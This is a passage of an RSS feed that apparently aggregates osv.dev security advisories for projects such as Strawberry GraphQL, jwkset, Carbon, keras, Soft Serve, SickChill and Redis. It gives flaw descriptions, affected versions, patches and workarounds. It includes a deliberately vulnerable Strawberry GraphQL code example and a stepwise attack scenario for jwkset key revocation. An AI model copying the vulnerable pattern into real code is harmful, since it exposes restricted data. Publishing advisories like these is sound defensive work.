                            source: <a href='https://osv.dev/vulnerability/CVE-2024-25371'>https://osv.dev/vulnerability/CVE-2024-25371</a><br>
                            <b>Published:</b> 2025-01-10T16:15:28Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/ahoi-attacks/sigy/blob/main/pocs/gramine/cve.md'>https://github.com/ahoi-attacks/sigy/blob/main/pocs/gramine/cve.md</a></li></ul><br>
                            <b>Details:</b> <b></b><br>Gramine before a390e33e16ed374a40de2344562a937f289be2e1 suffers from an Interface vulnerability due to mismatching SW signals vs HW exceptions.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>CVE-2025-23022: 6.2 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#CVE-2025-23022</link>
                    <pubDate>2025-01-10T15:15:16Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/CVE-2025-23022'>https://osv.dev/vulnerability/CVE-2025-23022</a><br>
                            <b>Published:</b> 2025-01-10T15:15:16Z<br>
                            <b>Severity:</b> 6.2<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://gitlab.freedesktop.org/freetype/freetype/-/issues/1312'>https://gitlab.freedesktop.org/freetype/freetype/-/issues/1312</a></li><li>- <a target='_blank' href='https://security-tracker.debian.org/tracker/CVE-2025-23022'>https://security-tracker.debian.org/tracker/CVE-2025-23022</a></li></ul><br>
                            <b>Details:</b> <b></b><br>FreeType 2.8.1 has a signed integer overflow in cf2_doFlex in cff&#x2F;cf2intrp.c.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GO-2025-3376: 0 | JWK Set&#x27;s HTTP client only overwrites and appends JWK to local cache during refresh in github.com&#x2F;MicahParks&#x2F;jwkset</title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GO-2025-3376</link>
                    <pubDate>2025-01-09T19:41:13Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GO-2025-3376'>https://osv.dev/vulnerability/GO-2025-3376</a><br>
                            <b>Published:</b> 2025-01-09T19:41:13Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/MicahParks/jwkset/issues/40'>https://github.com/MicahParks/jwkset/issues/40</a></li></ul><br>
                            <b>Details:</b> JWK Set&#x27;s HTTP client only overwrites and appends JWK to local cache during refresh in github.com&#x2F;MicahParks&#x2F;jwkset
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-5xh2-23cc-5jc6: 3.7 | <b>Strawberry GraphQL has type resolution vulnerability in node interface that allows potential data leakage through incorrect type resolution</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-5xh2-23cc-5jc6</link>
                    <pubDate>2025-01-09T18:51:51Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-5xh2-23cc-5jc6'>https://osv.dev/vulnerability/GHSA-5xh2-23cc-5jc6</a><br>
                            <b>Published:</b> 2025-01-09T18:51:51Z<br>
                            <b>Severity:</b> 3.7<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/strawberry-graphql/strawberry/security/advisories/GHSA-5xh2-23cc-5jc6'>https://github.com/strawberry-graphql/strawberry/security/advisories/GHSA-5xh2-23cc-5jc6</a></li><li>- <a target='_blank' href='https://github.com/strawberry-graphql/strawberry/commit/526eb82b70451c0e59d5a71ae9b7396f59974bd8'>https://github.com/strawberry-graphql/strawberry/commit/526eb82b70451c0e59d5a71ae9b7396f59974bd8</a></li><li>- <a target='_blank' href='https://github.com/strawberry-graphql/strawberry'>https://github.com/strawberry-graphql/strawberry</a></li></ul><br>
                            <b>Details:</b> <b>Strawberry GraphQL has type resolution vulnerability in node interface that allows potential data leakage through incorrect type resolution</b><br>**Vulnerability Summary**
A type confusion vulnerability exists in Strawberry GraphQL&#x27;s relay integration that affects multiple ORM integrations (Django, SQLAlchemy, Pydantic). The vulnerability occurs when multiple GraphQL types are mapped to the same underlying model while using the relay `node` interface.

**Affected Components**
- Strawberry GraphQL relay integration
- Specifically impacts implementations using:
  - Django integration
  - SQLAlchemy integration
  - Pydantic integration

**Technical Details**

The vulnerability manifests when:
1. Multiple GraphQL types inherit from `relay.Node`
2. These types are mapped to the same database model
3. The global `node` field is used for type resolution

Example of vulnerable code:

```python
from fruits.models import Fruit
import strawberry_django
import strawberry

@strawberry_django.type(Fruit)
class FruitType(relay.Node):
    name: strawberry.auto

@strawberry_django.type(Fruit)
class SpecialFruitType(relay.Node):
    secret_name: strawberry.auto

@strawberry.type
class Query:
    node: relay.Node = strawberry_django.node()
```

**Security Impact**

When querying for a specific type using the global `node` field (e.g., `FruitType:some-id`), the resolver may incorrectly return an instance of a different type mapped to the same model (e.g., `SpecialFruitType`). This can lead to:

1. Information disclosure if the alternate type exposes sensitive fields
2. Potential privilege escalation if the alternate type contains data intended for restricted access

**Note**
Even with knowledge of the correct type name (e.g., `SpecialFruitType`), attackers may still be able to access unauthorized data through direct type queries.

We recommend to use permission on fields instead of creating a dedicate type.

**Recommendations**
1. Avoid mapping multiple relay Node types to the same model
2. Implement strict access controls at the field resolution level (using permissions)
3. Consider using separate models for different access levels of the same data
4. Update to `strawberry-graphql&amp;gt;=0.257.0`
5. If using `strawberry-graphql-django`, update to `strawberry-graphql-django&amp;gt;=0.54.0`
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>CVE-2025-22149: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#CVE-2025-22149</link>
                    <pubDate>2025-01-09T18:15:30Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/CVE-2025-22149'>https://osv.dev/vulnerability/CVE-2025-22149</a><br>
                            <b>Published:</b> 2025-01-09T18:15:30Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/MicahParks/jwkset/issues/40'>https://github.com/MicahParks/jwkset/issues/40</a></li></ul><br>
                            <b>Details:</b> <b></b><br>JWK Set (JSON Web Key Set) is a JWK and JWK Set Go implementation. Prior to 0.6.0, the project&#x27;s provided HTTP client&#x27;s local JWK Set cache should do a full replacement when the goroutine refreshes the remote JWK Set. The current behavior is to overwrite or append. This is a security issue for use cases that utilize the provided auto-caching HTTP client and where key removal from a JWK Set is equivalent to revocation. The affected auto-caching HTTP client was added in version v0.5.0 and fixed in v0.6.0. The only workaround would be to remove the provided auto-caching HTTP client and replace it with a custom implementation. This involves setting the HTTPClientStorageOptions.RefreshInterval to zero (or not specifying the value).
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-675f-rq2r-jw82: 2.1 | <b>JWK Set&#x27;s HTTP client only overwrites and appends JWK to local cache during refresh</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-675f-rq2r-jw82</link>
                    <pubDate>2025-01-09T17:23:43Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-675f-rq2r-jw82'>https://osv.dev/vulnerability/GHSA-675f-rq2r-jw82</a><br>
                            <b>Published:</b> 2025-01-09T17:23:43Z<br>
                            <b>Severity:</b> 2.1<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/MicahParks/jwkset/security/advisories/GHSA-675f-rq2r-jw82'>https://github.com/MicahParks/jwkset/security/advisories/GHSA-675f-rq2r-jw82</a></li><li>- <a target='_blank' href='https://github.com/MicahParks/jwkset/issues/40'>https://github.com/MicahParks/jwkset/issues/40</a></li><li>- <a target='_blank' href='https://github.com/MicahParks/jwkset/pull/41'>https://github.com/MicahParks/jwkset/pull/41</a></li><li>- <a target='_blank' href='https://github.com/MicahParks/jwkset/commit/01db49a90f7f20c7fb39a699a2f19a7a5f379ed3'>https://github.com/MicahParks/jwkset/commit/01db49a90f7f20c7fb39a699a2f19a7a5f379ed3</a></li><li>- <a target='_blank' href='https://github.com/MicahParks/jwkset'>https://github.com/MicahParks/jwkset</a></li></ul><br>
                            <b>Details:</b> <b>JWK Set&#x27;s HTTP client only overwrites and appends JWK to local cache during refresh</b><br>### Impact
The project&#x27;s provided HTTP client&#x27;s local JWK Set cache should do a full replacement when the goroutine refreshes the remote JWK Set. The current behavior is to overwrite or append. This is a security issue for use cases that utilize the provided auto-caching HTTP client and where key removal from a JWK Set is equivalent to revocation.

Example attack scenario:
1. An attacker has stolen the private key for a key published in JWK Set.
2. The publishers of that JWK Set remove that key from the JWK Set.
3. Enough time has passed that the program using the auto-caching HTTP client found in `github.com&#x2F;MicahParks&#x2F;jwkset` v0.5.0-v0.5.21 has elapsed its `HTTPClientStorageOptions.RefreshInterval` duration, causing a refresh of the remote JWK Set.
4. The attacker is signing content (such as JWTs) with the stolen private key and the system has no other forms of revocation.

### Patches
The affected auto-caching HTTP client was added in version `v0.5.0` and fixed in `v0.6.0`. Upgrade to `v0.6.0` or later.

### Workarounds
The only workaround would be to remove the provided auto-caching HTTP client and replace it with a custom implementation. This involves setting the `HTTPClientStorageOptions.RefreshInterval` to zero (or not specifying the value). Upgrade to `v0.6.0` is advised.

### References
Please see the tracking issue on GitHub for additional details: https:&#x2F;&#x2F;github.com&#x2F;MicahParks&#x2F;jwkset&#x2F;issues&#x2F;40

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-7w6r-748w-mh52: 8.0 | <b>pgAdmin has Incorrect Default Permissions</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-7w6r-748w-mh52</link>
                    <pubDate>2025-01-09T09:31:42Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-7w6r-748w-mh52'>https://osv.dev/vulnerability/GHSA-7w6r-748w-mh52</a><br>
                            <b>Published:</b> 2025-01-09T09:31:42Z<br>
                            <b>Severity:</b> 8.0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/pgadmin-org/pgadmin4/issues/6100'>https://github.com/pgadmin-org/pgadmin4/issues/6100</a></li><li>- <a target='_blank' href='https://github.com/pgadmin-org/pgadmin4/commit/fa29ba91632634d961f937ce3ed2c3b5a9d78f59'>https://github.com/pgadmin-org/pgadmin4/commit/fa29ba91632634d961f937ce3ed2c3b5a9d78f59</a></li><li>- <a target='_blank' href='https://access.redhat.com/security/cve/CVE-2023-1907'>https://access.redhat.com/security/cve/CVE-2023-1907</a></li><li>- <a target='_blank' href='https://bugzilla.redhat.com/show_bug.cgi?id=2218384'>https://bugzilla.redhat.com/show_bug.cgi?id=2218384</a></li><li>- <a target='_blank' href='https://github.com/pgadmin-org/pgadmin4'>https://github.com/pgadmin-org/pgadmin4</a></li><li>- <a target='_blank' href='https://github.com/pgadmin-org/pgadmin4/blob/a9974b418c49760d3989b7fb25e052ff16b89ac6/docs/en_US/release_notes_7_0.rst'>https://github.com/pgadmin-org/pgadmin4/blob/a9974b418c49760d3989b7fb25e052ff16b89ac6/docs/en_US/release_notes_7_0.rst</a></li></ul><br>
                            <b>Details:</b> <b>pgAdmin has Incorrect Default Permissions</b><br>A vulnerability was found in pgadmin. Users logging into pgAdmin running in server mode using LDAP authentication may be attached to another user&#x27;s session if multiple connection attempts occur simultaneously.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-6gf2-ffq8-gcww: 1.9 | <b>GHSL-2024-288: SickChill open redirect in login</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-6gf2-ffq8-gcww</link>
                    <pubDate>2025-01-08T22:03:58Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-6gf2-ffq8-gcww'>https://osv.dev/vulnerability/GHSA-6gf2-ffq8-gcww</a><br>
                            <b>Published:</b> 2025-01-08T22:03:58Z<br>
                            <b>Severity:</b> 1.9<br>
                            <b>Langs:</b> py<br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/SickChill/sickchill/pull/8811'>https://github.com/SickChill/sickchill/pull/8811</a></li><li>- <a target='_blank' href='https://github.com/SickChill/sickchill/commit/c7128a8946c3701df95c285810eb75b2de18bf82'>https://github.com/SickChill/sickchill/commit/c7128a8946c3701df95c285810eb75b2de18bf82</a></li><li>- <a target='_blank' href='https://github.com/SickChill/sickchill'>https://github.com/SickChill/sickchill</a></li><li>- <a target='_blank' href='https://github.com/SickChill/sickchill/blob/846adafdfab579281353ea08a27bbb813f9a9872/sickchill/views/authentication.py#L33'>https://github.com/SickChill/sickchill/blob/846adafdfab579281353ea08a27bbb813f9a9872/sickchill/views/authentication.py#L33</a></li></ul><br>
                            <b>Details:</b> <b>GHSL-2024-288: SickChill open redirect in login</b><br>SickChill is an automatic video library manager for TV shows. A user-controlled `login` endpoint&#x27;s `next_` parameter takes arbitrary content. Prior to commit c7128a8946c3701df95c285810eb75b2de18bf82, an authenticated attacker may use this to redirect the user to arbitrary destinations, leading to open redirect. Commit c7128a8946c3701df95c285810eb75b2de18bf82 changes the login page to redirect to `settings.DEFAULT_PAGE` instead of to the `next` parameter.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-8h93-28hg-fj84: 6.4 | <b>Composio Command Execution vulnerability</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-8h93-28hg-fj84</link>
                    <pubDate>2025-01-08T21:32:25Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-8h93-28hg-fj84'>https://osv.dev/vulnerability/GHSA-8h93-28hg-fj84</a><br>
                            <b>Published:</b> 2025-01-08T21:32:25Z<br>
                            <b>Severity:</b> 6.4<br>
                            <b>Langs:</b> py<br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/ComposioHQ/composio/issues/1073'>https://github.com/ComposioHQ/composio/issues/1073</a></li><li>- <a target='_blank' href='https://github.com/ComposioHQ/composio/pull/1107'>https://github.com/ComposioHQ/composio/pull/1107</a></li><li>- <a target='_blank' href='https://github.com/ComposioHQ/composio/commit/f496f7fa776335ae7825cad2991c9b38923271fc'>https://github.com/ComposioHQ/composio/commit/f496f7fa776335ae7825cad2991c9b38923271fc</a></li><li>- <a target='_blank' href='https://github.com/ComposioHQ/composio'>https://github.com/ComposioHQ/composio</a></li><li>- <a target='_blank' href='https://github.com/ComposioHQ/composio/blob/11ee7470aa6543097ee30bb036af8e9726dc7a85/python/plugins/claude/composio_claude/toolset.py#L156'>https://github.com/ComposioHQ/composio/blob/11ee7470aa6543097ee30bb036af8e9726dc7a85/python/plugins/claude/composio_claude/toolset.py#L156</a></li><li>- <a target='_blank' href='https://github.com/ComposioHQ/composio/blob/11ee7470aa6543097ee30bb036af8e9726dc7a85/python/plugins/julep/composio_julep/toolset.py#L21'>https://github.com/ComposioHQ/composio/blob/11ee7470aa6543097ee30bb036af8e9726dc7a85/python/plugins/julep/composio_julep/toolset.py#L21</a></li><li>- <a target='_blank' href='https://github.com/ComposioHQ/composio/blob/11ee7470aa6543097ee30bb036af8e9726dc7a85/python/plugins/openai/composio_openai/toolset.py#L184'>https://github.com/ComposioHQ/composio/blob/11ee7470aa6543097ee30bb036af8e9726dc7a85/python/plugins/openai/composio_openai/toolset.py#L184</a></li></ul><br>
                            <b>Details:</b> <b>Composio Command Execution vulnerability</b><br>composio &amp;gt;=0.5.40 is vulnerable to Command Execution in composio_openai, composio_claude, and composio_julep via the handle_tool_calls function.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>CVE-2024-53995: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#CVE-2024-53995</link>
                    <pubDate>2025-01-08T21:15:12Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/CVE-2024-53995'>https://osv.dev/vulnerability/CVE-2024-53995</a><br>
                            <b>Published:</b> 2025-01-08T21:15:12Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> py<br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/SickChill/sickchill/blob/846adafdfab579281353ea08a27bbb813f9a9872/sickchill/views/authentication.py#L33'>https://github.com/SickChill/sickchill/blob/846adafdfab579281353ea08a27bbb813f9a9872/sickchill/views/authentication.py#L33</a></li><li>- <a target='_blank' href='https://github.com/SickChill/sickchill/pull/8811'>https://github.com/SickChill/sickchill/pull/8811</a></li></ul><br>
                            <b>Details:</b> <b></b><br>SickChill is an automatic video library manager for TV shows. A user-controlled `login` endpoint&#x27;s `next_` parameter takes arbitrary content. Prior to commit c7128a8946c3701df95c285810eb75b2de18bf82, an authenticated attacker may use this to redirect the user to arbitrary destinations, leading to open redirect. Commit c7128a8946c3701df95c285810eb75b2de18bf82 changes the login page to redirect to `settings.DEFAULT_PAGE` instead of to the `next` parameter.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>CVE-2024-12431: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#CVE-2024-12431</link>
                    <pubDate>2025-01-08T21:15:11Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/CVE-2024-12431'>https://osv.dev/vulnerability/CVE-2024-12431</a><br>
                            <b>Published:</b> 2025-01-08T21:15:11Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://about.gitlab.com/releases/2025/01/08/patch-release-gitlab-17-7-1-released/#unauthorized-user-can-manipulate-status-of-issues-in-public-projects'>https://about.gitlab.com/releases/2025/01/08/patch-release-gitlab-17-7-1-released/#unauthorized-user-can-manipulate-status-of-issues-in-public-projects</a></li><li>- <a target='_blank' href='https://gitlab.com/gitlab-org/gitlab/-/issues/508742'>https://gitlab.com/gitlab-org/gitlab/-/issues/508742</a></li><li>- <a target='_blank' href='https://hackerone.com/reports/2877710'>https://hackerone.com/reports/2877710</a></li></ul><br>
                            <b>Details:</b> <b></b><br>An issue was discovered in GitLab CE&#x2F;EE affecting all versions starting from 15.5 before 17.5.5, 17.6 before 17.6.3, and 17.7 before 17.7.1, in which unauthorized users could manipulate the status of issues in public projects.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-j3f9-p6hm-5w6q: 6.3 | <b>Carbon has an arbitrary file include via unvalidated input passed to Carbon::setLocale</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-j3f9-p6hm-5w6q</link>
                    <pubDate>2025-01-08T21:03:28Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-j3f9-p6hm-5w6q'>https://osv.dev/vulnerability/GHSA-j3f9-p6hm-5w6q</a><br>
                            <b>Published:</b> 2025-01-08T21:03:28Z<br>
                            <b>Severity:</b> 6.3<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/CarbonPHP/carbon/security/advisories/GHSA-j3f9-p6hm-5w6q'>https://github.com/CarbonPHP/carbon/security/advisories/GHSA-j3f9-p6hm-5w6q</a></li><li>- <a target='_blank' href='https://github.com/briannesbitt/Carbon/commit/129700ed449b1f02d70272d2ac802357c8c30c58'>https://github.com/briannesbitt/Carbon/commit/129700ed449b1f02d70272d2ac802357c8c30c58</a></li><li>- <a target='_blank' href='https://github.com/CarbonPHP/carbon'>https://github.com/CarbonPHP/carbon</a></li></ul><br>
                            <b>Details:</b> <b>Carbon has an arbitrary file include via unvalidated input passed to Carbon::setLocale</b><br>### Impact
Application passing unsanitized user input to `Carbon::setLocale` are at risk of arbitrary file include, if the application allows users to upload files with `.php` extension in an folder that allows `include` or `require` to read it, then they are at risk of arbitrary code ran on their servers.

### Patches
- [3.8.4](https:&#x2F;&#x2F;github.com&#x2F;briannesbitt&#x2F;Carbon&#x2F;releases&#x2F;tag&#x2F;3.8.4)
- [2.72.6](https:&#x2F;&#x2F;github.com&#x2F;briannesbitt&#x2F;Carbon&#x2F;releases&#x2F;tag&#x2F;2.72.6)

### Workarounds
Any of the below actions can be taken to prevent the issue:
- Validate input before calling `setLocale()`, for instance by forbidding or removing `&#x2F;` and `\`
- Call `setLocale()` only with a locale from a whitelist of supported locales
- When uploading files, rename them so they cannot have a `.php` extension (this is recommended even if you&#x27;re not affected by this issue)
- Prefer storage system that are not local to the application (remote service, or local service ran by another user so the uploaded files actually live outside of the application basedir)

### References
https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;File_inclusion_vulnerability

### Credits
Thanks to **Szczepan Hołyszewski** who reported the issue and to Tidelift to coordinate the resolution
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-cjgq-5qmw-rcj6: 5.5 | <b>keras Path Traversal vulnerability</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-cjgq-5qmw-rcj6</link>
                    <pubDate>2025-01-08T18:30:48Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-cjgq-5qmw-rcj6'>https://osv.dev/vulnerability/GHSA-cjgq-5qmw-rcj6</a><br>
                            <b>Published:</b> 2025-01-08T18:30:48Z<br>
                            <b>Severity:</b> 5.5<br>
                            <b>Langs:</b> py<br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/keras-team/keras'>https://github.com/keras-team/keras</a></li><li>- <a target='_blank' href='https://github.com/keras-team/keras/blob/8f5592bcb61ff48c96560c8923e482db1076b54a/keras/src/utils/file_utils.py#L115'>https://github.com/keras-team/keras/blob/8f5592bcb61ff48c96560c8923e482db1076b54a/keras/src/utils/file_utils.py#L115</a></li><li>- <a target='_blank' href='https://keras.io'>https://keras.io</a></li><li>- <a target='_blank' href='https://river-bicycle-f1e.notion.site/Arbitrary-File-Write-Vulnerability-in-get_file-function-11888e31952580179224e50892976d32'>https://river-bicycle-f1e.notion.site/Arbitrary-File-Write-Vulnerability-in-get_file-function-11888e31952580179224e50892976d32</a></li></ul><br>
                            <b>Details:</b> <b>keras Path Traversal vulnerability</b><br>An issue in keras 3.7.0 allows attackers to write arbitrary files to the user&#x27;s machine via downloading a crafted tar file through the get_file function.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-j4jw-m6xr-fv6c: 5.3 | <b>Soft Serve vulnerable to path traversal attacks</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-j4jw-m6xr-fv6c</link>
                    <pubDate>2025-01-08T15:43:25Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-j4jw-m6xr-fv6c'>https://osv.dev/vulnerability/GHSA-j4jw-m6xr-fv6c</a><br>
                            <b>Published:</b> 2025-01-08T15:43:25Z<br>
                            <b>Severity:</b> 5.3<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/charmbracelet/soft-serve/security/advisories/GHSA-j4jw-m6xr-fv6c'>https://github.com/charmbracelet/soft-serve/security/advisories/GHSA-j4jw-m6xr-fv6c</a></li><li>- <a target='_blank' href='https://github.com/charmbracelet/soft-serve/commit/a8d1bf3f9349c138383b65079b7b8ad97fff78f4'>https://github.com/charmbracelet/soft-serve/commit/a8d1bf3f9349c138383b65079b7b8ad97fff78f4</a></li><li>- <a target='_blank' href='https://github.com/charmbracelet/soft-serve'>https://github.com/charmbracelet/soft-serve</a></li><li>- <a target='_blank' href='https://github.com/charmbracelet/soft-serve/releases/tag/v0.8.2'>https://github.com/charmbracelet/soft-serve/releases/tag/v0.8.2</a></li></ul><br>
                            <b>Details:</b> <b>Soft Serve vulnerable to path traversal attacks</b><br>### Impact

Path traversal attack gives access to existing non-admin users to access and take over other user&#x27;s repositories. A malicious user then can modify, delete, and arbitrarily repositories as if they were an admin user without explicitly giving them permissions.

### Patches

This is patched in [v0.8.2](https:&#x2F;&#x2F;github.com&#x2F;charmbracelet&#x2F;soft-serve&#x2F;releases&#x2F;tag&#x2F;v0.8.2)

### Workarounds

Single user set-ups are not affected. This only affects multi-user Soft Serve set-ups that enable repository creation for users. Otherwise, upgrading is necessary to circumvent the attack.



                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-valkey-2024-46981: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-valkey-2024-46981</link>
                    <pubDate>2025-01-08T07:22:30.615Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-valkey-2024-46981'>https://osv.dev/vulnerability/BIT-valkey-2024-46981</a><br>
                            <b>Published:</b> 2025-01-08T07:22:30.615Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/redis/redis/releases/tag/6.2.17'>https://github.com/redis/redis/releases/tag/6.2.17</a></li><li>- <a target='_blank' href='https://github.com/redis/redis/releases/tag/7.2.7'>https://github.com/redis/redis/releases/tag/7.2.7</a></li><li>- <a target='_blank' href='https://github.com/redis/redis/releases/tag/7.4.2'>https://github.com/redis/redis/releases/tag/7.4.2</a></li><li>- <a target='_blank' href='https://github.com/redis/redis/security/advisories/GHSA-39h2-x6c4-6w4c'>https://github.com/redis/redis/security/advisories/GHSA-39h2-x6c4-6w4c</a></li><li>- <a target='_blank' href='https://lists.debian.org/debian-lts-announce/2025/01/msg00018.html'>https://lists.debian.org/debian-lts-announce/2025/01/msg00018.html</a></li></ul><br>
                            <b>Details:</b> <b></b><br>Redis is an open source, in-memory database that persists on disk. An authenticated user may use a specially crafted Lua script to manipulate the garbage collector and potentially lead to remote code execution. The problem is fixed in 7.4.2, 7.2.7, and 6.2.17. An additional workaround to mitigate the problem without patching the redis-server executable is to prevent users from executing Lua scripts. This can be done using ACL to restrict EVAL and EVALSHA commands.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-valkey-2024-51741: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-valkey-2024-51741</link>
                    <pubDate>2025-01-08T07:22:23.019Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-valkey-2024-51741'>https://osv.dev/vulnerability/BIT-valkey-2024-51741</a><br>
                            <b>Published:</b> 2025-01-08T07:22:23.019Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/redis/redis/security/advisories/GHSA-prpq-rh5h-46g9'>https://github.com/redis/redis/security/advisories/GHSA-prpq-rh5h-46g9</a></li></ul><br>
                            <b>Details:</b> <b></b><br>Redis is an open source, in-memory database that persists on disk. An authenticated with sufficient privileges may create a malformed ACL selector which, when accessed, triggers a server panic and subsequent denial of service. The problem is fixed in Redis 7.2.7 and 7.4.2.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-redis-2024-46981: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-redis-2024-46981</link>
                    <pubDate>2025-01-08T07:20:24.318Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-redis-2024-46981'>https://osv.dev/vulnerability/BIT-redis-2024-46981</a><br>
                            <b>Published:</b> 2025-01-08T07:20:24.318Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/redis/redis/releases/tag/6.2.17'>https://github.com/redis/redis/releases/tag/6.2.17</a></li><li>- <a target='_blank' href='https://github.com/redis/redis/releases/tag/7.2.7'>https://github.com/redis/redis/releases/tag/7.2.7</a></li><li>- <a target='_blank' href='https://github.com/redis/redis/releases/tag/7.4.2'>https://github.com/redis/redis/releases/tag/7.4.2</a></li><li>- <a target='_blank' href='https://github.com/redis/redis/security/advisories/GHSA-39h2-x6c4-6w4c'>https://github.com/redis/redis/security/advisories/GHSA-39h2-x6c4-6w4c</a></li><li>- <a target='_blank' href='https://lists.debian.org/debian-lts-announce/2025/01/msg00018.html'>https://lists.debian.org/debian-lts-announce/2025/01/msg00018.html</a></li></ul><br>
                            <b>Details:</b> <b></b><br>Redis is an open source, in-memory database that persists on disk. An authenticated user may use a specially crafted Lua script to manipulate the garbage collector and potentially lead to remote code execution. The problem is fixed in 7.4.2, 7.2.7, and 6.2.17. An additional workaround to mitigate the problem without patching the redis-server executable is to prevent users from executing Lua scripts. This can be done using ACL to restrict EVAL and EVALSHA commands.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-redis-2024-51741: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-redis-2024-51741</link>
                    <pubDate>2025-01-08T07:20:15.238Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-redis-2024-51741'>https://osv.dev/vulnerability/BIT-redis-2024-51741</a><br>
                            <b>Published:</b> 2025-01-08T07:20:15.238Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/redis/redis/security/advisories/GHSA-prpq-rh5h-46g9'>https://github.com/redis/redis/security/advisories/GHSA-prpq-rh5h-46g9</a></li></ul><br>
                            <b>Details:</b> <b></b><br>Redis is an open source, in-memory database that persists on disk. An authenticated with sufficient privileges may create a malformed ACL selector which, when accessed, triggers a server panic and subsequent denial of service. The problem is fixed in Redis 7.2.7 and 7.4.2.
                        ]]>
                    </description>
                </item>
            
                <item>
